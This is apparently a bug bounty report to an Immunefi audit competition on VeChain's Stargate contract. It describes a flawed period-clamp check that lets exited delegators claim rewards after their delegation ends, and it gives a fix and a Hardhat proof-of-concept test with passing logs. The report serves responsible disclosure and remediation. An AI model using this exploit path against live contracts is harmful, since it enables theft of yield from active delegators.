# 60192 sc high users can claim delegation rewards after exit endperiod has passed

**Submitted on Nov 19th 2025 at 18:41:47 UTC by @Rhaydden for** [**Audit Comp | Vechain | Stargate Hayabusa**](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)

* **Report ID:** #60192
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

A logic gap in Stargate’s reward claim window computation allows a token to claim delegation rewards for periods after its delegation has ended.

In `Stargate.sol::_claimableDelegationPeriods`, the `delegation ended` branch only triggers when `endPeriod > nextClaimablePeriod`. If `nextClaimablePeriod >= endPeriod`, the code falls through to the active/past branch and returns the current completed periods, effectively green-lighting claims for periods strictly after `endPeriod`.

[Stargate.sol](https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/blob/e9c0bc9b0f24dc0c44de273181d9a99aaf2c31b0/packages/contracts/contracts/Stargate.sol#L916-L930):

```solidity
// Lines ~916-930
if (
    endPeriod != type(uint32).max &&
    endPeriod < currentValidatorPeriod &&
    endPeriod > nextClaimablePeriod
) {
    return (nextClaimablePeriod, endPeriod);
}

// check that the start period is before the current validator period
if (nextClaimablePeriod < currentValidatorPeriod) {
    return (nextClaimablePeriod, completedPeriods);
}
```

When `nextClaimablePeriod == endPeriod`: this should clamp to `endPeriod`, but if the user had already claimed through `endPeriod`, `nextClaimablePeriod` becomes `endPeriod + 1` and the function returns a range that includes periods after `endPeriod`.

When `nextClaimablePeriod > endPeriod` (exhausted): the function still falls through and returns `(nextClaimablePeriod, completedPeriods)`.

## Finding description and impact

Exited delegators can claim rewards for a period in which they were no longer delegated. This is a direct transfer of unclaimed yield from active delegators to an ex-delegator.

High - Theft of unclaimed yield

Consider a scenario where:

* User delegates at period 1 and requests exit at period 3 (`endPeriod = 3`).
* User claims up to period 3 (so `lastClaimedPeriod = 3`).
* Later, validator advances to period 5.
* The function returns `(4, 4)` as claimable periods for the user, allowing a claim for period 4 even though the delegation ended at period 3.

{% hint style="danger" %}
Impact: Exited delegators can claim rewards for periods after their delegation ended, enabling theft of unclaimed yield from active delegators.
{% endhint %}

## Recommended mitigation steps

Clamp strictly when the delegation has ended, and guard the exhausted case:

```solidity
// Handle ended delegations first
if (endPeriod != type(uint32).max && endPeriod < currentValidatorPeriod) {
    if (nextClaimablePeriod > endPeriod) {
        // All claimable periods already consumed
        return (0, 0);
    }
    // Clamp to endPeriod (covers equality case, where one final period is claimable)
    return (nextClaimablePeriod, endPeriod);
}

// Active/pending: only completed periods are claimable
if (nextClaimablePeriod < currentValidatorPeriod) {
    return (nextClaimablePeriod, completedPeriods);
}

return (0, 0);
```

## Proof of concept

Created a test file `packages/contracts/test/unit/Stargate/PostExitClaimPoC.test.ts` demonstrating a token claiming rewards for a period after its delegation ended.

TypeScript/Hardhat test used as PoC:

```typescript
import { expect } from "chai";
import {
    MyERC20,
    MyERC20__factory,
    ProtocolStakerMock,
    ProtocolStakerMock__factory,
    Stargate,
    StargateNFTMock,
    StargateNFTMock__factory,
    TokenAuctionMock,
    TokenAuctionMock__factory,
} from "../../../typechain-types";
import { getOrDeployContracts } from "../../helpers/deploy";
import { createLocalConfig } from "@repo/config/contracts/envs/local";
import { ethers } from "hardhat";
import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";

// PoC: After exiting delegation and claiming up to endPeriod, the user can claim for the next period(s)
// if validator's current period advances, due to incorrect clamp in _claimableDelegationPeriods.
// This test sets up two delegators so period rewards denominator > 0, demonstrating actual theft of yield.

describe("PoC: Stargate - Claiming beyond delegation end", () => {
    const VTHO_TOKEN_ADDRESS = "0x0000000000000000000000000000456E65726779";
    const LEVEL_ID = 1;

    const REWARDS_PER_PERIOD = 10n ** 17n; // 0.1 VTHO as in ProtocolStakerMock
    const VALIDATOR_STATUS_ACTIVE = 2;

    let stargateContract: Stargate;
    let stargateNFTMock: StargateNFTMock;
    let protocolStakerMock: ProtocolStakerMock;
    let legacyNodesMock: TokenAuctionMock;
    let deployer: HardhatEthersSigner;
    let user: HardhatEthersSigner;
    let otherUser: HardhatEthersSigner;
    let validator: HardhatEthersSigner;
    let otherAccounts: HardhatEthersSigner[];
    let vthoTokenContract: MyERC20;

    beforeEach(async () => {
        const config = createLocalConfig();
        [deployer] = await ethers.getSigners();

        // Deploy protocol staker mock
        const protocolStakerMockFactory = new ProtocolStakerMock__factory(deployer);
        protocolStakerMock = await protocolStakerMockFactory.deploy();
        await protocolStakerMock.waitForDeployment();

        // Deploy stargateNFT mock
        const stargateNFTMockFactory = new StargateNFTMock__factory(deployer);
        stargateNFTMock = await stargateNFTMockFactory.deploy();
        await stargateNFTMock.waitForDeployment();

        // Deploy VTHO token to the energy address
        const vthoTokenContractFactory = new MyERC20__factory(deployer);
        const tokenContract = await vthoTokenContractFactory.deploy(
            deployer.address,
            deployer.address
        );
        await tokenContract.waitForDeployment();
        const tokenContractBytecode = await ethers.provider.getCode(tokenContract);
        await ethers.provider.send("hardhat_setCode", [VTHO_TOKEN_ADDRESS, tokenContractBytecode]);

        // Deploy legacy nodes mock
        const legacyNodesMockFactory = new TokenAuctionMock__factory(deployer);
        legacyNodesMock = await legacyNodesMockFactory.deploy();
        await legacyNodesMock.waitForDeployment();

        // Deploy contracts with mocks wired in
        config.PROTOCOL_STAKER_CONTRACT_ADDRESS = await protocolStakerMock.getAddress();
        config.STARGATE_NFT_CONTRACT_ADDRESS = await stargateNFTMock.getAddress();
        config.MAX_CLAIMABLE_PERIODS = 8;
        const contracts = await getOrDeployContracts({ forceDeploy: true, config });
        stargateContract = contracts.stargateContract;
        vthoTokenContract = MyERC20__factory.connect(VTHO_TOKEN_ADDRESS, deployer);
        user = contracts.otherAccounts[0];
        otherUser = contracts.otherAccounts[1];
        validator = contracts.otherAccounts[2];
        otherAccounts = contracts.otherAccounts;

        // add default validator and set active
        await (await protocolStakerMock.addValidation(validator.address, 120)).wait();
        await (
            await protocolStakerMock.helper__setStargate(stargateContract.target)
        ).wait();
        await (
            await protocolStakerMock.helper__setValidatorStatus(validator.address, VALIDATOR_STATUS_ACTIVE)
        ).wait();

        // set the mock values in the stargateNFTMock contract
        await (
            await stargateNFTMock.helper__setLevel({
                id: LEVEL_ID,
                name: "Strength",
                isX: false,
                maturityBlocks: 10,
                scaledRewardFactor: 150,
                vetAmountRequiredToStake: ethers.parseEther("1"),
            })
        ).wait();

        await (
            await stargateNFTMock.helper__setToken({
                tokenId: 10000,
                levelId: LEVEL_ID,
                mintedAtBlock: 0,
                vetAmountStaked: ethers.parseEther("1"),
                lastVetGeneratedVthoClaimTimestamp_deprecated: 0,
            })
        ).wait();

        await (await stargateNFTMock.helper__setLegacyNodes(legacyNodesMock)).wait();

        // mint VTHO to the stargate contract so it can reward users
        await (
            await vthoTokenContract.connect(deployer).mint(stargateContract, ethers.parseEther("50"))
        ).wait();
    });

    it("allows claiming rewards for a period after delegation has ended (bug PoC)", async () => {
        const levelSpec = await stargateNFTMock.getLevel(LEVEL_ID);

        // User stakes and delegates
        await (
            await stargateContract.connect(user).stake(LEVEL_ID, { value: levelSpec.vetAmountRequiredToStake })
        ).wait();
        const userTokenId = await stargateNFTMock.getCurrentTokenId();
        await (await stargateContract.connect(user).delegate(userTokenId, validator.address)).wait();

        // Keep at least one delegator active after user's exit so denominator > 0
        await (
            await stargateContract
                .connect(otherUser)
                .stake(LEVEL_ID, { value: levelSpec.vetAmountRequiredToStake })
        ).wait();
        const otherTokenId = await stargateNFTMock.getCurrentTokenId();
        await (
            await stargateContract.connect(otherUser).delegate(otherTokenId, validator.address)
        ).wait();

        // Fast-forward: completedPeriods = 2 (currentValidatorPeriod = 3)
        await (
            await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 2)
        ).wait();

        // User requests exit at current period (endPeriod = 3)
        await (await stargateContract.connect(user).requestDelegationExit(userTokenId)).wait();

        // Move to next period so delegation is considered ended (completedPeriods = 3, current = 4)
        await (
            await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 3)
        ).wait();

        // Claim up to endPeriod (2..3)
        await (await stargateContract.connect(user).claimRewards(userTokenId)).wait();

        // Advance another period (completedPeriods = 4, current = 5)
        await (
            await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 4)
        ).wait();

        // BUG: claimable periods should be none, but function returns (4,4)
        const [firstAfterExit, lastAfterExit] = await stargateContract.claimableDelegationPeriods(
            userTokenId
        );
        expect(firstAfterExit).to.equal(4n);
        expect(lastAfterExit).to.equal(4n);

        // And rewards are non-zero for that post-exit period due to flawed clamp
        const postExitClaimable = await stargateContract["claimableRewards(uint256)"](
            userTokenId
        );
        expect(postExitClaimable).to.equal(REWARDS_PER_PERIOD);

        // User can claim rewards for period 4 even though their delegation ended at period 3
        const pre = await vthoTokenContract.balanceOf(user.address);
        const tx = await stargateContract.connect(user).claimRewards(userTokenId);
        await expect(tx)
            .to.emit(stargateContract, "DelegationRewardsClaimed")
            .withArgs(user.address, userTokenId, 1, postExitClaimable, 4, 4);
        const post = await vthoTokenContract.balanceOf(user.address);
        expect(post - pre).to.equal(postExitClaimable);
    });
});
```

Run command used:

VITE\_APP\_ENV=local yarn workspace @repo/contracts hardhat test --network hardhat test/unit/Stargate/PostExitClaimPoC.test.ts

<details>

<summary>Logs</summary>

```
 PoC: Stargate - Claiming beyond delegation end
    ✔ allows claiming rewards for a period after delegation has ended (bug PoC)


  1 passing (451ms)

✨  Done in 2.20s.
✨  Done in 2.34s.
```

</details>
